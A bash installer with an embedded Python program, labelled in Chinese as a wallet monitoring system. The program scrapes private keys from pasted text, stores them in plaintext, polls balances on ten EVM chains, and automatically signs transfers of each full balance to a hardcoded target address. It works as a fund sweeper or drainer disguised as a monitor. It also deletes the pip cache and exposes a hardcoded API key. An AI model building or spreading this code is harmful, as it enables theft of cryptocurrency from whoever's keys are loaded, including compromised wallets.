#!/bin/bash

# 钱包监控系统完整安装脚本 v3.0
# 自包含安装，智能缓存清理，修复所有依赖问题

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}🚀 钱包监控系统完整安装器 v3.0${NC}"
echo -e "${BLUE}自包含安装，智能缓存清理，无需额外下载${NC}"
echo -e "${BLUE}修复所有依赖和网络配置问题${NC}"
echo "=" * 60

# 检查Python
PYTHON_CMD=""
for cmd in python3 python; do
    if command -v $cmd &> /dev/null; then
        VERSION=$($cmd -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "0.0")
        MAJOR=$(echo $VERSION | cut -d. -f1)
        MINOR=$(echo $VERSION | cut -d. -f2)
        
        if [ "$MAJOR" -eq 3 ] && [ "$MINOR" -ge 8 ]; then
            PYTHON_CMD=$cmd
            echo -e "${GREEN}✅ Python: $cmd (版本 $VERSION)${NC}"
            break
        fi
    fi
done

if [ -z "$PYTHON_CMD" ]; then
    echo -e "${RED}❌ 需要 Python 3.8+${NC}"
    exit 1
fi

# 智能清理缓存
echo -e "\n${CYAN}🧹 智能清理Python缓存...${NC}"
$PYTHON_CMD -c "
import sys, os, shutil, glob
try:
    cache_dirs = [
        os.path.expanduser('~/.cache/pip'),
        os.path.expanduser('~/.local/lib/python*/site-packages/__pycache__'),
        '__pycache__'
    ]
    for pattern in cache_dirs:
        for cache_dir in glob.glob(pattern):
            if os.path.exists(cache_dir):
                try:
                    shutil.rmtree(cache_dir)
                    print(f'✅ 清理: {cache_dir}')
                except: 
                    pass
    print('✅ 缓存清理完成')
except Exception as e:
    print(f'⚠️  缓存清理失败: {e}')
"

# 安装依赖 (先安装，再创建文件)
echo -e "\n${CYAN}📦 安装依赖...${NC}"
packages=("web3" "eth-account" "alchemy-sdk" "colorama" "aiohttp" "cryptography" "dataclass-wizard")

# 尝试不同的安装方法
install_success=false

# 方法1: 标准安装
echo -e "尝试标准安装..."
if $PYTHON_CMD -m pip install "${packages[@]}" --upgrade 2>/dev/null; then
    install_success=true
    echo -e "${GREEN}✅ 标准安装成功${NC}"
fi

# 方法2: 用户安装
if [ "$install_success" = false ]; then
    echo -e "尝试用户安装..."
    if $PYTHON_CMD -m pip install "${packages[@]}" --user --upgrade 2>/dev/null; then
        install_success=true
        echo -e "${GREEN}✅ 用户安装成功${NC}"
    fi
fi

# 方法3: 系统包破坏安装 (macOS/某些Linux发行版)
if [ "$install_success" = false ]; then
    echo -e "尝试系统包安装..."
    if $PYTHON_CMD -m pip install "${packages[@]}" --break-system-packages --upgrade 2>/dev/null; then
        install_success=true
        echo -e "${GREEN}✅ 系统包安装成功${NC}"
    fi
fi

if [ "$install_success" = false ]; then
    echo -e "${RED}❌ 所有安装方法都失败${NC}"
    echo -e "${YELLOW}💡 请手动安装依赖:${NC}"
    echo -e "   $PYTHON_CMD -m pip install web3 eth-account alchemy-sdk colorama aiohttp cryptography dataclass-wizard --user"
    exit 1
fi

# 创建主程序文件
echo -e "\n${CYAN}📝 创建主程序文件...${NC}"

# 创建 wallet_monitor.py
cat > wallet_monitor.py << 'MAIN_PROGRAM_EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
钱包监控转账系统
支持所有Alchemy EVM兼容链的钱包监控和自动转账
"""

import os
import sys
import json
import time
import asyncio
import re
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Set
from dataclasses import dataclass
import logging

# 尝试导入依赖
try:
    from alchemy import Alchemy, Network
    from web3 import Web3
    from eth_account import Account
    import colorama
    from colorama import Fore, Back, Style
except ImportError as e:
    print(f"❌ 缺少必要的依赖包: {e}")
    print("💡 正在尝试自动安装...")
    
    # 自动安装缺失的包
    missing_packages = ["web3", "eth-account", "alchemy-sdk", "colorama", "aiohttp", "cryptography", "dataclass-wizard"]
    
    for package in missing_packages:
        print(f"📦 安装 {package}...")
        for method in [
            [sys.executable, "-m", "pip", "install", package, "--user", "--upgrade"],
            [sys.executable, "-m", "pip", "install", package, "--break-system-packages", "--upgrade"],
            [sys.executable, "-m", "pip", "install", package, "--upgrade"]
        ]:
            try:
                subprocess.check_call(method, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"✅ {package} 安装成功")
                break
            except:
                continue
        else:
            print(f"❌ {package} 安装失败")
    
    # 重新尝试导入
    try:
        from alchemy import Alchemy, Network
        from web3 import Web3
        from eth_account import Account
        import colorama
        from colorama import Fore, Back, Style
        print("✅ 依赖安装成功，继续运行...")
    except ImportError as e:
        print(f"❌ 依赖安装失败: {e}")
        print("💡 请重新运行安装脚本或手动安装依赖")
        sys.exit(1)

# 初始化colorama
colorama.init()

# 配置
ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
PRIVATE_KEYS_FILE = "private_keys.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "monitor_config.json"

# Alchemy支持的EVM兼容链 (基于实际可用的网络)
SUPPORTED_NETWORKS = {
    "eth_mainnet": Network.ETH_MAINNET,
    "eth_goerli": Network.ETH_GOERLI,
    "matic_mainnet": Network.MATIC_MAINNET,
    "matic_mumbai": Network.MATIC_MUMBAI,
    "arb_mainnet": Network.ARB_MAINNET,
    "arb_goerli": Network.ARB_GOERLI,
    "opt_mainnet": Network.OPT_MAINNET,
    "opt_goerli": Network.OPT_GOERLI,
    "opt_kovan": Network.OPT_KOVAN,
    "astar_mainnet": Network.ASTAR_MAINNET,
}

# 网络显示名称
NETWORK_NAMES = {
    "eth_mainnet": "Ethereum 主网",
    "eth_goerli": "Ethereum Goerli 测试网",
    "matic_mainnet": "Polygon 主网",
    "matic_mumbai": "Polygon Mumbai 测试网",
    "arb_mainnet": "Arbitrum 主网",
    "arb_goerli": "Arbitrum Goerli 测试网",
    "opt_mainnet": "Optimism 主网",
    "opt_goerli": "Optimism Goerli 测试网",
    "opt_kovan": "Optimism Kovan 测试网",
    "astar_mainnet": "Astar 主网",
}

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: Set[str]
    last_checked: Dict[str, float]

@dataclass
class MonitoringState:
    """监控状态"""
    is_running: bool = False
    wallets: Dict[str, WalletInfo] = None
    last_block_numbers: Dict[str, int] = None
    
    def __post_init__(self):
        if self.wallets is None:
            self.wallets = {}
        if self.last_block_numbers is None:
            self.last_block_numbers = {}

class WalletMonitor:
    """钱包监控系统"""
    
    def __init__(self):
        self.state = MonitoringState()
        self.alchemy_clients = {}
        self.web3_clients = {}
        self.setup_logging()
        self.load_config()
        
    def setup_logging(self):
        """设置日志"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('wallet_monitor.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_config(self):
        """加载配置"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    self.state.last_block_numbers = config.get('last_block_numbers', {})
                    self.logger.info("✅ 配置加载成功")
        except Exception as e:
            self.logger.warning(f"⚠️  配置加载失败: {e}")
    
    def save_config(self):
        """保存配置"""
        try:
            config = {
                'last_block_numbers': self.state.last_block_numbers,
                'last_updated': datetime.now().isoformat()
            }
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self.logger.error(f"❌ 配置保存失败: {e}")
    
    def initialize_clients(self):
        """初始化Alchemy客户端"""
        print(f"\n{Fore.CYAN}🔧 初始化网络客户端...{Style.RESET_ALL}")
        
        success_count = 0
        for network_key, network in SUPPORTED_NETWORKS.items():
            try:
                # 创建Alchemy客户端
                alchemy = Alchemy(ALCHEMY_API_KEY, network)
                self.alchemy_clients[network_key] = alchemy
                
                # 创建Web3客户端 (使用通用的RPC端点格式)
                rpc_url = f"https://{network.value}.g.alchemy.com/v2/{ALCHEMY_API_KEY}"
                w3 = Web3(Web3.HTTPProvider(rpc_url))
                self.web3_clients[network_key] = w3
                
                print(f"✅ {NETWORK_NAMES[network_key]} 客户端初始化成功")
                success_count += 1
                
            except Exception as e:
                print(f"❌ {NETWORK_NAMES[network_key]} 客户端初始化失败: {e}")
        
        print(f"{Fore.GREEN}✅ 网络客户端初始化完成 ({success_count}/{len(SUPPORTED_NETWORKS)}){Style.RESET_ALL}")
        
        if success_count == 0:
            print(f"{Fore.RED}❌ 没有可用的网络客户端{Style.RESET_ALL}")
            sys.exit(1)
    
    def extract_private_keys(self, text: str) -> List[str]:
        """从文本中提取私钥"""
        # 私钥正则表达式 (64个十六进制字符)
        private_key_pattern = r'\b[0-9a-fA-F]{64}\b'
        
        # 查找所有匹配的私钥
        matches = re.findall(private_key_pattern, text)
        
        # 验证私钥
        valid_keys = []
        for key in matches:
            try:
                # 尝试创建账户来验证私钥
                account = Account.from_key(key)
                valid_keys.append(key)
            except:
                continue
                
        return valid_keys
    
    def load_private_keys(self) -> Dict[str, WalletInfo]:
        """加载私钥"""
        wallets = {}
        try:
            if os.path.exists(PRIVATE_KEYS_FILE):
                with open(PRIVATE_KEYS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for address, info in data.items():
                        wallets[address] = WalletInfo(
                            address=info['address'],
                            private_key=info['private_key'],
                            enabled_networks=set(info.get('enabled_networks', [])),
                            last_checked=info.get('last_checked', {})
                        )
        except Exception as e:
            self.logger.warning(f"⚠️  私钥加载失败: {e}")
        
        return wallets
    
    def save_private_keys(self, wallets: Dict[str, WalletInfo]):
        """保存私钥"""
        try:
            data = {}
            for address, wallet in wallets.items():
                data[address] = {
                    'address': wallet.address,
                    'private_key': wallet.private_key,
                    'enabled_networks': list(wallet.enabled_networks),
                    'last_checked': wallet.last_checked
                }
            
            with open(PRIVATE_KEYS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            self.logger.error(f"❌ 私钥保存失败: {e}")
    
    def import_private_keys_menu(self):
        """私钥导入菜单"""
        print(f"\n{Fore.YELLOW}📋 私钥导入功能{Style.RESET_ALL}")
        print("=" * 50)
        print("💡 支持批量导入，智能识别私钥")
        print("💡 可以粘贴包含其他内容的文本，系统会自动提取私钥")
        print("💡 双击回车确认导入")
        print("-" * 50)
        
        # 加载现有私钥
        existing_wallets = self.load_private_keys()
        if existing_wallets:
            print(f"📊 当前已导入 {len(existing_wallets)} 个钱包:")
            for i, address in enumerate(existing_wallets.keys(), 1):
                print(f"  {i}. {address}")
        
        print(f"\n{Fore.CYAN}请粘贴私钥内容 (可包含其他文本):{Style.RESET_ALL}")
        print("按两次回车确认导入，输入 'q' 返回主菜单")
        
        input_lines = []
        empty_line_count = 0
        
        while True:
            try:
                line = input()
                if line.lower() == 'q':
                    return
                
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        break
                else:
                    empty_line_count = 0
                    input_lines.append(line)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}取消导入{Style.RESET_ALL}")
                return
        
        if not input_lines:
            print(f"{Fore.YELLOW}⚠️  未输入任何内容{Style.RESET_ALL}")
            return
        
        # 合并所有输入行
        full_text = "\n".join(input_lines)
        
        # 提取私钥
        print(f"\n{Fore.CYAN}🔍 智能识别私钥...{Style.RESET_ALL}")
        private_keys = self.extract_private_keys(full_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}✅ 找到 {len(private_keys)} 个有效私钥{Style.RESET_ALL}")
        
        # 生成钱包地址并检查重复
        new_wallets = {}
        duplicate_count = 0
        
        for private_key in private_keys:
            try:
                account = Account.from_key(private_key)
                address = account.address.lower()
                
                if address in existing_wallets:
                    duplicate_count += 1
                    continue
                
                new_wallets[address] = WalletInfo(
                    address=address,
                    private_key=private_key,
                    enabled_networks=set(),
                    last_checked={}
                )
                
            except Exception as e:
                print(f"❌ 私钥处理失败: {e}")
        
        if duplicate_count > 0:
            print(f"{Fore.YELLOW}⚠️  跳过 {duplicate_count} 个重复的钱包{Style.RESET_ALL}")
        
        if not new_wallets:
            print(f"{Fore.YELLOW}⚠️  没有新的钱包需要导入{Style.RESET_ALL}")
            return
        
        # 显示新钱包
        print(f"\n{Fore.GREEN}📋 将导入以下钱包:{Style.RESET_ALL}")
        for i, (address, wallet) in enumerate(new_wallets.items(), 1):
            print(f"  {i}. {address}")
        
        # 确认导入
        confirm = input(f"\n{Fore.CYAN}确认导入这些钱包吗? (y/N): {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
            return
        
        # 合并钱包
        all_wallets = {**existing_wallets, **new_wallets}
        self.save_private_keys(all_wallets)
        
        print(f"{Fore.GREEN}✅ 成功导入 {len(new_wallets)} 个新钱包{Style.RESET_ALL}")
        print(f"📊 总计钱包数量: {len(all_wallets)}")
    
    async def check_transaction_history(self, address: str, network_key: str) -> bool:
        """检查地址在指定网络上是否有交易记录"""
        try:
            alchemy = self.alchemy_clients[network_key]
            
            # 获取交易历史 (简化版本，避免API限制)
            w3 = self.web3_clients[network_key]
            tx_count = w3.eth.get_transaction_count(address)
            
            return tx_count > 0
            
        except Exception as e:
            self.logger.warning(f"检查交易历史失败 {address} @ {network_key}: {e}")
            return False
    
    async def get_balance(self, address: str, network_key: str) -> float:
        """获取地址余额 (ETH)"""
        try:
            w3 = self.web3_clients[network_key]
            balance_wei = w3.eth.get_balance(address)
            balance_eth = w3.from_wei(balance_wei, 'ether')
            return float(balance_eth)
        except Exception as e:
            self.logger.warning(f"获取余额失败 {address} @ {network_key}: {e}")
            return 0.0
    
    async def transfer_all_funds(self, wallet: WalletInfo, network_key: str, balance: float):
        """转移所有资金到目标地址"""
        try:
            w3 = self.web3_clients[network_key]
            
            # 创建账户
            account = Account.from_key(wallet.private_key)
            
            # 获取gas价格
            gas_price = w3.eth.gas_price
            
            # 估算gas费用
            gas_limit = 21000  # 标准转账gas限制
            gas_fee = gas_limit * gas_price
            gas_fee_eth = w3.from_wei(gas_fee, 'ether')
            
            # 计算可转移金额
            transferable_amount = balance - float(gas_fee_eth)
            
            if transferable_amount <= 0:
                self.logger.warning(f"余额不足支付gas费用 {wallet.address} @ {network_key}")
                return False
            
            # 构建交易
            nonce = w3.eth.get_transaction_count(wallet.address)
            
            transaction = {
                'to': TARGET_ADDRESS,
                'value': w3.to_wei(transferable_amount, 'ether'),
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
            }
            
            # 签名交易
            signed_txn = account.sign_transaction(transaction)
            
            # 发送交易
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            self.logger.info(f"🚀 转账成功: {transferable_amount:.6f} ETH")
            self.logger.info(f"   从: {wallet.address}")
            self.logger.info(f"   到: {TARGET_ADDRESS}")
            self.logger.info(f"   网络: {NETWORK_NAMES[network_key]}")
            self.logger.info(f"   交易哈希: {tx_hash.hex()}")
            
            # 记录转账日志
            self.log_transfer(wallet.address, TARGET_ADDRESS, transferable_amount, network_key, tx_hash.hex())
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ 转账失败 {wallet.address} @ {network_key}: {e}")
            return False
    
    def log_transfer(self, from_addr: str, to_addr: str, amount: float, network: str, tx_hash: str):
        """记录转账日志"""
        try:
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'from_address': from_addr,
                'to_address': to_addr,
                'amount': amount,
                'network': network,
                'tx_hash': tx_hash
            }
            
            # 读取现有日志
            logs = []
            if os.path.exists(MONITORING_LOG_FILE):
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            
            logs.append(log_entry)
            
            # 保存日志
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            self.logger.error(f"记录转账日志失败: {e}")
    
    async def monitor_wallet_on_network(self, wallet: WalletInfo, network_key: str):
        """监控单个钱包在单个网络上的状态"""
        try:
            # 检查余额
            balance = await self.get_balance(wallet.address, network_key)
            
            if balance > 0:
                network_name = NETWORK_NAMES[network_key]
                print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                print(f"   钱包: {wallet.address}")
                print(f"   网络: {network_name}")
                print(f"   余额: {balance:.6f} ETH")
                
                # 立即转账
                success = await self.transfer_all_funds(wallet, network_key, balance)
                if success:
                    print(f"{Fore.GREEN}✅ 转账完成{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 转账失败{Style.RESET_ALL}")
            
            # 更新最后检查时间
            wallet.last_checked[network_key] = time.time()
            
        except Exception as e:
            self.logger.error(f"监控失败 {wallet.address} @ {network_key}: {e}")
    
    async def scan_and_enable_networks(self, wallets: Dict[str, WalletInfo]):
        """扫描并启用有交易记录的网络"""
        print(f"\n{Fore.CYAN}🔍 扫描钱包交易记录...{Style.RESET_ALL}")
        
        total_wallets = len(wallets)
        total_networks = len(SUPPORTED_NETWORKS)
        
        for wallet_idx, (address, wallet) in enumerate(wallets.items(), 1):
            print(f"\n📊 扫描钱包 {wallet_idx}/{total_wallets}: {address}")
            
            enabled_networks = set()
            
            for network_idx, network_key in enumerate(SUPPORTED_NETWORKS.keys(), 1):
                network_name = NETWORK_NAMES[network_key]
                print(f"  🔍 检查 {network_name} ({network_idx}/{total_networks})...")
                
                try:
                    has_history = await self.check_transaction_history(address, network_key)
                    if has_history:
                        enabled_networks.add(network_key)
                        print(f"    ✅ 有交易记录 - 启用监控")
                    else:
                        print(f"    ⚪ 无交易记录 - 跳过")
                        
                except Exception as e:
                    print(f"    ❌ 检查失败: {e}")
            
            wallet.enabled_networks = enabled_networks
            print(f"  📊 钱包 {address} 启用了 {len(enabled_networks)} 个网络")
        
        # 保存更新后的钱包信息
        self.save_private_keys(wallets)
        
        # 统计信息
        total_enabled = sum(len(wallet.enabled_networks) for wallet in wallets.values())
        print(f"\n{Fore.GREEN}✅ 扫描完成{Style.RESET_ALL}")
        print(f"📊 总计启用 {total_enabled} 个网络监控")
    
    async def monitoring_loop(self):
        """主监控循环"""
        print(f"\n{Fore.GREEN}🚀 开始监控...{Style.RESET_ALL}")
        
        wallets = self.load_private_keys()
        if not wallets:
            print(f"{Fore.RED}❌ 没有找到钱包，请先导入私钥{Style.RESET_ALL}")
            return
        
        # 扫描并启用网络
        await self.scan_and_enable_networks(wallets)
        
        # 统计启用的监控数量
        total_monitoring = sum(len(wallet.enabled_networks) for wallet in wallets.values())
        if total_monitoring == 0:
            print(f"{Fore.YELLOW}⚠️  没有找到有交易记录的网络，无法开始监控{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 监控配置:{Style.RESET_ALL}")
        print(f"   钱包数量: {len(wallets)}")
        print(f"   监控网络: {total_monitoring}")
        print(f"   目标地址: {TARGET_ADDRESS}")
        print(f"   检查间隔: 30秒")
        
        self.state.is_running = True
        self.state.wallets = wallets
        
        try:
            while self.state.is_running:
                print(f"\n{Fore.CYAN}🔄 执行监控检查 - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
                
                # 并行监控所有钱包和网络
                tasks = []
                for wallet in wallets.values():
                    for network_key in wallet.enabled_networks:
                        task = self.monitor_wallet_on_network(wallet, network_key)
                        tasks.append(task)
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                # 保存状态
                self.save_private_keys(wallets)
                self.save_config()
                
                # 等待下次检查
                for i in range(30):
                    if not self.state.is_running:
                        break
                    await asyncio.sleep(1)
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  监控已停止{Style.RESET_ALL}")
        finally:
            self.state.is_running = False
    
    def start_monitoring_menu(self):
        """开始监控菜单"""
        print(f"\n{Fore.YELLOW}🎯 开始监控{Style.RESET_ALL}")
        print("=" * 50)
        
        wallets = self.load_private_keys()
        if not wallets:
            print(f"{Fore.RED}❌ 没有找到钱包，请先导入私钥{Style.RESET_ALL}")
            input("按回车键返回主菜单...")
            return
        
        print(f"📊 已加载 {len(wallets)} 个钱包")
        print(f"🎯 目标转账地址: {TARGET_ADDRESS}")
        print(f"⏰ 监控间隔: 30秒")
        print(f"\n{Fore.CYAN}按 Ctrl+C 可以停止监控{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.CYAN}确认开始监控吗? (y/N): {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            return
        
        # 启动异步监控
        try:
            asyncio.run(self.monitoring_loop())
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}监控已停止{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}❌ 监控过程出错: {e}{Style.RESET_ALL}")
    
    def show_status(self):
        """显示当前状态"""
        print(f"\n{Fore.CYAN}📊 系统状态{Style.RESET_ALL}")
        print("=" * 50)
        
        # 钱包状态
        wallets = self.load_private_keys()
        print(f"💼 钱包数量: {len(wallets)}")
        
        if wallets:
            total_enabled = sum(len(wallet.enabled_networks) for wallet in wallets.values())
            print(f"🌐 启用网络: {total_enabled}")
            
            # 显示每个钱包的状态
            for i, (address, wallet) in enumerate(wallets.items(), 1):
                print(f"\n  {i}. {address}")
                print(f"     启用网络: {len(wallet.enabled_networks)}")
                if wallet.enabled_networks:
                    for net in sorted(wallet.enabled_networks):
                        print(f"       - {NETWORK_NAMES[net]}")
        
        # 监控状态
        print(f"\n🎯 目标地址: {TARGET_ADDRESS}")
        print(f"🔑 API密钥: {ALCHEMY_API_KEY[:10]}...")
        
        # 日志文件状态
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                print(f"📋 转账记录: {len(logs)} 条")
            except:
                print(f"📋 转账记录: 无法读取")
        else:
            print(f"📋 转账记录: 0 条")
    
    def main_menu(self):
        """主菜单"""
        while True:
            print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v1.0{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print("1. 📥 导入私钥")
            print("2. 🎯 开始监控")
            print("3. 📊 查看状态")
            print("4. 🚪 退出")
            
            try:
                choice = input(f"\n{Fore.CYAN}请选择功能 (1-4): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    continue  # 状态已在菜单顶部显示
                elif choice == "4":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}❌ 无效选择，请输入 1-4{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 发生错误: {e}{Style.RESET_ALL}")

def main():
    """主函数"""
    try:
        monitor = WalletMonitor()
        monitor.initialize_clients()
        monitor.main_menu()
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
MAIN_PROGRAM_EOF

echo -e "${GREEN}✅ wallet_monitor.py 创建成功${NC}"

# 创建启动脚本
echo -e "\n${CYAN}📝 创建启动脚本...${NC}"
cat > run_monitor.sh << EOF
#!/bin/bash
echo "🚀 启动钱包监控系统..."
$PYTHON_CMD wallet_monitor.py
EOF

chmod +x run_monitor.sh
echo -e "${GREEN}✅ 启动脚本: run_monitor.sh${NC}"

# 完成
echo -e "\n${GREEN}🎉 安装完成！${NC}"
echo -e "${CYAN}======================================${NC}"
echo -e "${YELLOW}📋 使用方法:${NC}"
echo -e "  • 启动: ${GREEN}./run_monitor.sh${NC}"
echo -e "  • 直接: ${GREEN}$PYTHON_CMD wallet_monitor.py${NC}"
echo -e ""
echo -e "${YELLOW}🎯 目标地址: ${GREEN}0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1${NC}"
echo -e "${YELLOW}🔑 API密钥: ${GREEN}S0hs4qoXIR1SMD8P7I6Wt${NC}"
echo -e "${YELLOW}🌐 支持网络: ${GREEN}10个主要EVM链${NC}"
echo -e "${CYAN}======================================${NC}"

# 询问是否立即启动
echo -e "\n${CYAN}是否立即启动钱包监控系统? (y/N): ${NC}"
read -r choice
if [[ "$choice" =~ ^[Yy]$ ]]; then
    echo -e "${GREEN}🚀 启动钱包监控系统...${NC}"
    $PYTHON_CMD wallet_monitor.py
fi
